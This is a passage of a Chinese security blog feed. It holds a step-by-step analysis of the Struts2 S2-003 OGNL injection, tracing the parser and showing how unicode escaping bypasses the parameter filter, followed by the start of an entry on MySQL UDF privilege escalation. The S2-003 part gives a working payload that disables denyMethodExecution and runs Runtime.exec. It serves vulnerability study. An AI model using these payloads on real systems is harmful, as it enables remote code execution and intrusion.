class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.11.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Struts2<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.jsp如下:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">17974</span></span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">1</span>/<span class="number">23</span></span><br><span class="line">  Time: <span class="number">14</span>:<span class="number">57</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-003&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-003 Demo&lt;/h2&gt;</span><br><span class="line">Success!</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0X02-S2-003"><a href="#0X02-S2-003" class="headerlink" title="0X02:S2-003"></a>0X02:S2-003</h1><p><strong>触发点</strong>:</p><p>每个人对于漏洞的触发点理解不同,我认为触发点是开始执行恶意代码地方,也就是OgnlUtil.getValue或者OgnlUtil.setValue,与S2-001一样,只是我们通过不同的方法/路径,找到了控制参数的办法,最终的结果都是控制了OgnlUtil.getValue或这OgnlUtil.setValue的expr参数</p><p>按照我的理解整个S2-003的触发点位于调用了位于com.opensymphony.xwork2.util.OgnlValueStack.setValue方法中的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlUtil.setValue(expr, context, root, value);</span><br></pre></td></tr></table></figure><p>由于这个地方的expr可控,并且payload中使用unicode编码绕过了拦截器对特殊字符的拦截</p><p>让我们来看看这个expr参数是从何而来的</p><p>断点来到com.opensymphony.xwork2.interceptor.ParamatersInterceptor.doIntercept方法中代码段</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124001680.png" class title="image-20220126124001680"><p>155行处设置了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlContextState.setDenyMethodExecution(contextMap, true);</span><br></pre></td></tr></table></figure><p>Deny Method Execution顾名思义,拒绝方法执行,此处将这个值设置为true,也就是说我们等等需要修改这个地方为false才能允许我们方法执行从而执行静态方法</p><p>我们进入159行setParameters</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124335412.png" class title="image-20220126124335412"><p>来到setParameters方法里面看到186行,acceptableName(name)那么便是我们刚刚传进去的参数,这里是对参数进行一个判断,返回的是bool类型的值.</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124543892.png" class title="image-20220126124543892"><p>可以看到简单粗暴的判断了字符串中是否存在=,:#,在高一点的版本中这个地方是采用正则进行过滤的,但是不影响</p><p>由于我们的#采用unicode编码,所以这个地方就饶过了.</p><p>到这个地方就产生了一个疑问:为什么unicode编码可以被ongl表达式解析?后面会进行说明</p><p>绕过了acceptableName,就来到了193行的stack.setValue(name),进入setValue方法,便来到了触发点</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126124946931.png" class title="image-20220126124946931">158行调用 OnglUtil.setValue(expr,context,root,value)<p>到这个地方expr还是我们可控的,就是我们的参数,并且unicode编码没有被解析,那我们可以肯定unicode编码的解析是ognl完成的而不是struct,而到这个地方,整个漏洞对于Struct的解析已经完成了,因为执行这个ognl表达式全部都是ognl的事情,和struct没有关系.<strong>到这,我们就应该停一下.把对struct的分析转换到对Ognl表达式的分析来也是本篇文章的重点</strong></p><h1 id="0x03-OnglUtil-setValue-expr-context-root-value"><a href="#0x03-OnglUtil-setValue-expr-context-root-value" class="headerlink" title="0x03:OnglUtil.setValue(expr,context,root,value)"></a>0x03:OnglUtil.setValue(expr,context,root,value)</h1><p><strong>现在我们的目的就是找出一个expr,可以执行代码,可以修改上下文</strong></p><p>tpis:上下文(context)</p><p>何为上下文?可以理解为一个临时环境变量,context是一个大的hashmap,需要用到的变量,值可以从里面取出</p><p>为什么叫上下文?举个例子,一篇小说,直接给你看一句话说主角死了,没有文章的上下文你就不知道前因后果,主角为什么死了?程序也是一样的,单独的一行代码而没有上下文你就不知道为什么要执行这行代码,这行代码的意义是配合之前的代码呢还是为下面即将运行的代码做准备,所以取了这么个名字.而在本次文章中,经常见到的context就是此次程序运行的上下文.</p><p>从struct中脱离出来,搭建本地环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.CompoundRoot;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.util.OgnlUtil;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">        OgnlContext context = new OgnlContext();#创建上下文</span><br><span class="line">        CompoundRoot root = new CompoundRoot();#创建root对象</span><br><span class="line">        context.put(&quot;flag&quot;,true);#往context中放入变量flag,值为true</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            OgnlUtil.setValue(<span class="string">&quot;(&#x27;#context[\\&#x27;flag\\&#x27;]=false&#x27;)(&#x27;bla&#x27;)(&#x27;bla&#x27;)&quot;</span>,context,root,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(context.get(&quot;flag&quot;));#从context获取值</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126133954776.png" class title="image-20220126133954776"><p>可以看到成功修改了flag的值为false,但是同时也报错了,why?</p><p>接下来将深入对ognl表达式解析过程进行分析</p><p>跟进OgnlUtil.setValue</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126134332559.png" class title="image-20220126134332559"><p>看到compile(name),compile的作用是生成一颗AST树,跟进</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126140329340.png" class title="image-20220126140329340"><p>可以看到它调用了Ognl.parseExpression()去生成ASTchain,类型是ASTEval类型,可以看到,经过compline的转换后,原始的(one)(two)(three)被解析成了((one)(two))(three),因为只有这样才能满足下面的转换分配节点.</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141023578.png" class title="image-20220126141023578"><p>这个树长这样</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141635081.png" class title="image-20220126141635081"><p>带着这样一个AST树进入Ognl.setValue</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141745774.png" class title="image-20220126141745774"><p>将我们的ASTEval转换为Node类型,调用它的setValue(),继续跟进</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141910573.png" class title="image-20220126141910573"><p>紧接着调用evaluateSetValueBody</p><p>跟进:</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141938967.png" class title="image-20220126141938967"><p>此时this为((“#context[&#39;flag&#39;]=false”)(“bla”))(“bla”)也就是根节点</p><p>跟进141行调用根节点的setValueBody</p><p><strong>注意,此时是进入了setValue的第35行,等等我们会回到这里(第一次注意)</strong></p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142046434.png" class title="image-20220126142046434"><p>此时调用childern[0]的getValue方法,childern[0]的值为(“#context[&#39;flag&#39;]=false”)(“bla”)</p><p>跟进,调用childern[0]的evaluateGetValueBody方法,注意,此时的evaluateGetValueBody方法是SimpleNode类中的,和上一步的evaluateGetValueBody不一样,因为此时childern[0]是一个node</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142514861.png" class title="image-20220126142514861"><p>此时的this,也就是chrildern[0]是(“#context[&#39;flag&#39;]=false”)(“bla”),它仍然是一个ASTevalchain,还可以被继续解析,所以在第130行判断是否为常量的时候直接返回false,继续调用(ASTEval)this.getValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126142712711.png" class title="image-20220126142712711"><p>此时我们又进入了和刚刚一样的代码段,是因为我们在递归解析这个AST树,直到解析到没有AST树结构存在时才会停止,此时的childern[0]</p><p>是”#context[&#39;flag&#39;]=false”此时他已经是一个ASTConst了,调用getValue接着和上面一样调用evaluateGetValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/L02JOLIVBP%60V0_ZS5K%7D6%7BDR.png" class title="img"><p>可以看到此时已经是ASTConst类型的数据了,进入if后将this.constantValue为true,131行进入的是ASTConst的getValueBody,里面直接返回了true,然后直接135行return</p><p>解析完毕左节点childern[0]后来到了之前的位置</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143709106.png" class title="image-20220126143709106"><p>此时解析childer[1],childern[1]的值是bla,也就是个字符串</p><p>和刚刚一样的调用栈,跟进getvalue,然后跟进evaluateGetValueBody,childern[1]是ASTConst类型的,直接return</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143905160.png" class title="image-20220126143905160"><p>回来了,此时source为”bla”</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126143956352.png" class title="image-20220126143956352"><p>往下来到result = node.getValue(context,source)</p><p>此时node为#context[“flag”] = false,source为”bla”,node的类型为ASTAssign</p><p>调用node的getValue,然后调用evaluateGetValueBody</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126144641526.png" class title="image-20220126144641526"><p>又来到这个熟悉的地方,不过此时this是ASTAssign,所以进入ASTAssing的getValueBody方法</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126144737881.png" class title="image-20220126144737881"><p>可以看到此时children[0]是ASTChain,children[1]是ASTConst</p><p>此时result的值为false,调用children[0].setvalue,跟以前一样最终会调用ASTChain类型的setValueBody</p><p><strong>注意(第二次注意)</strong>:此时result的值是childern[1]的值,也就是我们payload中=右边的那个值,在这里被拆成ASTConst了,这个result是要返回的,返回到setValue的第35行,也就是我第一次说注意的那个地方的setvalue,这与为什么执行成功但是却报错了有直接关系</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145209254.png" class title="image-20220126145209254"><p>在ASTChain类型的setValueBody中调用ASTProperty的一个setValue,最终会调用到</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145351591.png" class title="image-20220126145351591"><p>进入setProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145455320.png" class title="image-20220126145455320"><p>继续跟进accessor.setProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145536323.png" class title="image-20220126145536323"><p>此时map就是我们的context,name就是flag,value是false</p><p>至此,就完成了对context中flag字段的值的修改</p><p>还没有结束,现在我们完成了对第一层childern[0]的解析,还有第一层childern[1]的解析</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126141635081.png" class title="image-20220126141635081"><p><strong>注意,此时是离开了setValue的第35行(第三次注意)</strong></p><p>此时我们回来到了第一次进入的setValue方法,刚刚所有的都是在第35行里面进行的,现在执行完了第三十五行,回到这开始继续往下执行</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126145940830.png" class title="image-20220126145940830"><p>此时的expr为刚刚返回的result,第二次注意已经说了所以此时expr的值等于payload中等号右边的值等于false</p><p>38行expr被转换为Node,但他并不是一个合法的ongl表达式,所以在第42行尝试调用node.setValue方法进行解析的时候直接就报错了并且报错信息为”321”不是一个正确的OGNL表达式</p><p>Exception in thread “main” ognl.InappropriateExpressionException: Inappropriate OGNL expression: 321</p><p>至此,整个调用过程就讲解完毕了</p><h1 id="0X04-回到Struts2"><a href="#0X04-回到Struts2" class="headerlink" title="0X04:回到Struts2"></a>0X04:回到Struts2</h1><p>1.为什么unicode编码能绕过?</p><p>因为在生成AST树的时候compile中使用了JavaCharStream来读取数据流,我发现了这样一段代码</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126152130767.png" class title="image-20220126152130767"><p>当读取到\u时会继续读取四个字符,并将它们转换为char,这就解释了为什么unicode可以被解析成功了</p><p>2.编写payload</p><p>0X01中说了,刚开始的时候会将OgnlContextState.setDenyMethodExecution(contextMap, true);设为True,禁止我们执行方法,那首先就需要将他改成false</p><p>利用payload修改上下文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>第二个参数执行静态方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>细心的同学可能发现了,这里payload后面两个括号时不带有’’的,是(mengda)而不是(‘mengda’)</p><p>因为不带引号在单独测试的环境中会报错,原因是在通过ASTProperty的getValueBody方法时,accessor类型为</p><p>ListPropertyAccessor导致的,原因不明,所以加不加引号对struct的复现没有影响,只是不加引号本地单独复现会报错</p><p>大概给大家看一下原因,这是ASTProperty的getValueBody方法</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153450622.png" class title="image-20220126153450622"><p>跟进getProperty</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153522745.png" class title="image-20220126153522745"><p>跟进getPropertyAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153548744.png" class title="image-20220126153548744"><p>可以发现此时的answer已经变成了ListPropertyAccessor</p><p>而加上引号的话此处就会变成MapPropertyAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126153702432.png" class title="image-20220126153702432"><p>在struct环境中无论加不加引号此处的值都为CompoundRootAccessor</p><img src="/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220126154030687.png" class title="image-20220126154030687">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;S2-003是第我审计的第二个java漏洞,其中核心还是围绕着OGNL表达式注入的利用,在我的”Struts2-S001”中以一种初学者</summary>
      
    
    
    
    
    <category term="-Java代码审计 -Struts2" scheme="http://example.com/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Struts2/"/>
    
  </entry>
  
  <entry>
    <title>UDF提权</title>
    <link href="http://example.com/2022/01/14/UDF%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2022/01/14/UDF%E6%8F%90%E6%9D%83/</id>
    <published>2022-01-14T08:32:56.000Z</published>
    <updated>2022-01-27T11:00:28.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UDF（user-defined-function"><a href="#UDF（user-defined-function" class="headerlink" title="UDF（user defined function)"></a>UDF（user defined function)</h1><p>mysql自带的函数有user(),version()等,除了自带的函数,用户可以自定义一些函数方便在查询的时候使用它们,我们把这些函数称之为UDF(user defined function)</p><p>用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function function_name returns &#123;string|integer|real|decimal&#125; routine_body</span><br></pre></td></tr></table></figure><p>function_name:函数名</p><p>routine_body:由合法的sql语句构成的函数体</p><p>举个例子:</p><p> 查询user表id为1的username我们应该这么写:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from user where id &#x3D; 1;</span><br></pre></td></tr></table></figure><p>执行结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| mengda   |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>这个时候我们自定义一个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function getUserName(userid int) returns varchar(30) return (select username from user where id &#x3D; userid);</span><br></pre></td></tr></table></figure><p>然后执行这个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select getUserName(1);</span><br></pre></td></tr></table></figure><p>执行结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------+</span><br><span class="line">| getUserName(1) |</span><br><span class="line">+----------------+</span><br><span class="line">| mengda         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><h1 id="create-function中的SONAME关键字"><a href="#create-function中的SONAME关键字" class="headerlink" title="create function中的SONAME关键字"></a>create function中的SONAME关键字</h1><p> 我们来看这一行sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function udf_add returns int SONAME &quot;udf_add.so&quot;;</span><br></pre></td></tr></table></figure><p><code>so</code>文件命名规则被称为SONAME,在这个地方,我们的udf_add函数需要从udf_add.so文件中去加载,查看加载so文件的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br><span class="line">+-------------------------------+------------------------+</span><br><span class="line">| Variable_name                 | Value                  |</span><br><span class="line">+-------------------------------+------------------------+</span><br><span class="line">| default_authentication_plugin | mysql_native_password  |</span><br><span class="line">| plugin_dir                    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+-------------------------------+------------------------+</span><br></pre></td></tr></table></figure><p>可以看到mysql会去加载/usr/lib/mysql/plugin/下的so文件</p><p>我自己尝试写了一下这个udf_add.so</p><p>udf_add.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mysql.h&gt; </span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udf_add</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="keyword">char</span> *is_null, <span class="keyword">char</span> *error)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = *((<span class="keyword">int</span> *)args-&gt;args[<span class="number">0</span>]);  </span><br><span class="line">    <span class="keyword">int</span> b = *((<span class="keyword">int</span> *)args-&gt;args[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">return</span> a + b;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">udf_add_init</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里我定义了一个udf_add函数,传入函数的是一个UDF_ARGS数组,取前两位相加获得结果</p><p>创建.so文件,并将其移动到对应的so文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 